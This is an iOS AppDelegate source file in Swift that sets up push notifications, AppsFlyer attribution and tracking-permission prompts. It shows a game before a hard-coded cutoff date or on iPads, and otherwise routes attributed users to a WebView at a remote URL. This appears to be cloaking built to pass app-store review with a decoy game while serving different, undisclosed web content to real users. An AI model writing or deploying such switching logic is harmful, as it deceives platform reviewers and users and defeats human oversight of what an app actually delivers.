import Foundation
import UIKit
import AppsFlyerLib
import AdSupport
import OneSignalFramework
import AppTrackingTransparency

public class AppDelegate: NSObject, UIApplicationDelegate, AppsFlyerLibDelegate {
    public static var shared: AppDelegate?
    public var orientationMask: UIInterfaceOrientationMask = .portrait
    public var onParamsArrived: (() -> Void)?
    private var appStatus = UserDefaults.standard.integer(forKey: AppConfig.Keys.appStatus)
    
    public func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return orientationMask
    }
    
    public func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        print("🚀 Starting application launch")
        AppDelegate.shared = self
        
        if UserDefaults.standard.bool(forKey: AppConfig.Keys.forceGame) || 
           UserDefaults.standard.bool(forKey: AppConfig.Keys.apiFailed) {
            print("🎮 Using saved game mode state, skipping checks")
            UserDefaults.standard.set(true, forKey: AppConfig.Keys.checksComplete)
            UserDefaults.standard.set(2, forKey: AppConfig.Keys.appStatus)
            self.appStatus = 2
            AppParameters.shared.transitionToGame()
            return true
        }
        
        let currentDate = Date()
        let cutoffDate = AppConfig.contentViewEndDate
        print("📅 LAUNCH CHECK - Current date: \(currentDate)")
        print("📅 LAUNCH CHECK - Cutoff date: \(cutoffDate)")
        print("📅 LAUNCH CHECK - Is before cutoff: \(currentDate < cutoffDate)")
        
        let forceGameMode = currentDate < cutoffDate || 
                          UIDevice.current.model == "iPad" || 
                          UIDevice.current.userInterfaceIdiom == .pad
        
        if forceGameMode {
            print("🎮 LAUNCH CHECK - Will use game mode after permissions")
            UserDefaults.standard.set(true, forKey: AppConfig.Keys.forceGame)
            UserDefaults.standard.set(false, forKey: AppConfig.Keys.webViewShown)
            UserDefaults.standard.set("", forKey: AppConfig.Keys.targetUrl)
            UserDefaults.standard.set(2, forKey: AppConfig.Keys.appStatus)
            self.appStatus = 2
        }
        
        setupOneSignal(launchOptions: launchOptions)
        setupAppsFlyer()
        requestTrackingPermission(launchOptions)
        
        return true
    }
    
    public func updateScreenOrientation() {
        print("🔄 Updating screen orientation")
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            if let activeScene = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                activeScene.windows.forEach { window in
                    window.rootViewController?.setNeedsUpdateOfSupportedInterfaceOrientations()
                }
            }
        }
    }
    
    private func setupOneSignal(launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
        print("📱 Setting up OneSignal")
        let defaults = UserDefaults.standard
        
        // Используем AppsFlyer UID вместо генерации собственного ID
        let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID()
        print("📱 Using AppsFlyer UID as push identifier: \(appsFlyerUID)")
        defaults.set(appsFlyerUID, forKey: AppConfig.Keys.pushIdentifier)
        
        if !defaults.bool(forKey: AppConfig.Keys.pushPermissionAsked) {
            defaults.set(false, forKey: AppConfig.Keys.pushPermissionAsked)
        }
        
        OneSignal.initialize(AppConfig.oneSignalAppId, withLaunchOptions: launchOptions)
        print("📱 Logging into OneSignal with ID: \(appsFlyerUID)")
        OneSignal.login(appsFlyerUID)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if !defaults.bool(forKey: AppConfig.Keys.pushPermissionAsked) {
                print("📱 Requesting push notification permission")
                OneSignal.Notifications.requestPermission({ granted in
                    print("📱 Push permission response - granted: \(granted)")
                    defaults.set(true, forKey: AppConfig.Keys.pushPermissionAsked)
                }, fallbackToSettings: false)
            }
        }
    }
    
    private func setupAppsFlyer() {
        print("📊 Setting up AppsFlyer")
        let appsFlyer = AppsFlyerLib.shared()
        appsFlyer.appsFlyerDevKey = AppConfig.appsFlyerDevKey
        appsFlyer.appleAppID = AppConfig.appleAppId
        appsFlyer.waitForATTUserAuthorization(timeoutInterval: 60)
        appsFlyer.delegate = self
        appsFlyer.isDebug = false
        print("📊 AppsFlyer configuration complete")
    }
    
    private func requestTrackingPermission(_ launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
        print("🔒 Starting IDFA request process")
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            if #available(iOS 14, *) {
                let currentStatus = ATTrackingManager.trackingAuthorizationStatus
                print("🔒 Current tracking status: \(self.trackingAuthorizationStatusToString(currentStatus))")
                
                if currentStatus == .notDetermined {
                    print("🔒 Requesting IDFA permission")
                    ATTrackingManager.requestTrackingAuthorization { [weak self] status in
                        guard let self = self else { return }
                        
                        print("🔒 IDFA permission response: \(self.trackingAuthorizationStatusToString(status))")
                        
                        AppParameters.shared.updateState { state in
                            state.isTrackingResponded = true
                            state.idfaPermissionResponded = true
                        }
                        
                        AppsFlyerLib.shared().start()
                        self.tryingAskNotifications(launchOptions)
                    }
                } else {
                    print("🔒 IDFA already determined: \(self.trackingAuthorizationStatusToString(currentStatus))")
                    
                    AppParameters.shared.updateState { state in
                        state.isTrackingResponded = true
                        state.idfaPermissionResponded = true
                    }
                    
                    AppsFlyerLib.shared().start()
                    self.tryingAskNotifications(launchOptions)
                }
            } else {
                AppsFlyerLib.shared().start()
                
                AppParameters.shared.updateState { state in
                    state.isTrackingResponded = true
                    state.idfaPermissionResponded = true
                }
                
                self.tryingAskNotifications(launchOptions)
            }
        }
    }
    
    private func trackingAuthorizationStatusToString(_ status: ATTrackingManager.AuthorizationStatus) -> String {
        switch status {
        case .authorized: return "Authorized"
        case .denied: return "Denied"
        case .restricted: return "Restricted"
        case .notDetermined: return "Not Determined"
        @unknown default: return "Unknown"
        }
    }
    
    // Метод generateDeviceId удален, теперь используется AppsFlyerLib.shared().getAppsFlyerUID()
    
    private func tryingAskNotifications(_ launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
        print("🔔 tryingAskNotifications started")
        
        if UserDefaults.standard.bool(forKey: AppConfig.Keys.pushPermissionAsked) {
            print("🔔 Notifications were already requested before")
            
            if UserDefaults.standard.bool(forKey: AppConfig.Keys.forceGame) {
                print("🎮 Force game mode is active, transitioning to game")
                UserDefaults.standard.set(true, forKey: AppConfig.Keys.checksComplete)
                AppParameters.shared.transitionToGame()
                return
            }
            
            self.waitForAppsFlyer()
            return
        }
        
        DispatchQueue.main.async {
            print("🔔 Requesting notification permissions")
            OneSignal.Notifications.requestPermission({ [weak self] isGranted in
                guard let self = self else { return }
                
                print("🔔 Notification permission response: \(isGranted)")
                
                DispatchQueue.main.async {
                    UserDefaults.standard.setValue(true, forKey: AppConfig.Keys.pushPermissionAsked)
                    
                    if UserDefaults.standard.bool(forKey: AppConfig.Keys.forceGame) {
                        print("🎮 Force game mode is active, transitioning to game")
                        UserDefaults.standard.set(true, forKey: AppConfig.Keys.checksComplete)
                        AppParameters.shared.transitionToGame()
                        return
                    }
                    
                    self.waitForAppsFlyer()
                }
            }, fallbackToSettings: true)
        }
    }
    
    private func waitForAppsFlyer() {
        print("⏳ Waiting for AppsFlyer data...")
        
        if UserDefaults.standard.bool(forKey: AppConfig.Keys.forceGame) {
            print("🎮 Force game mode is active, skipping server requests")
            UserDefaults.standard.set(true, forKey: AppConfig.Keys.checksComplete)
            AppParameters.shared.transitionToGame()
            return
        }
        
        UserDefaults.standard.set(false, forKey: AppConfig.Keys.checksComplete)
        
        if let savedUrl = UserDefaults.standard.string(forKey: AppConfig.Keys.targetUrl),
           !savedUrl.isEmpty {
            print("🌐 Found saved URL: \(savedUrl)")
            print("🌐 Transitioning to WebView immediately")
            AppParameters.shared.transitionToWebView(url: savedUrl)
            return
        }
        
        if let existingData = AppParameters.shared.getConversionData() {
            print("📊 Using existing AppsFlyer data")
            AppParameters.shared.updateState { state in
                state.isDataReceived = true
            }
            AppParameters.shared.processLink()
        } else {
            print("📊 No existing data, initializing routing")
            AppParameters.shared.initializeRouting()
        }
    }
    
    // MARK: - AppsFlyer Delegate Methods
    public func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        print("📊 AppsFlyer conversion data received: \(conversionInfo)")
        guard let data = conversionInfo as? [String: Any] else { return }
        
        AppParameters.shared.saveConversionData(data)
        
        DispatchQueue.main.async {
            AppParameters.shared.updateState { state in
                state.isDataReceived = true
            }
            AppParameters.shared.processLink()
        }
    }
    
    public func onConversionDataFail(_ error: Error) {
        print("❌ AppsFlyer conversion data error: \(error)")
        
        AppParameters.shared.updateState { state in
            state.isErrorOccurred = true
            state.isDataFetched = true
        }
    }
    
    public func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        print("🔗 Handling URL open: \(url)")
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }
}
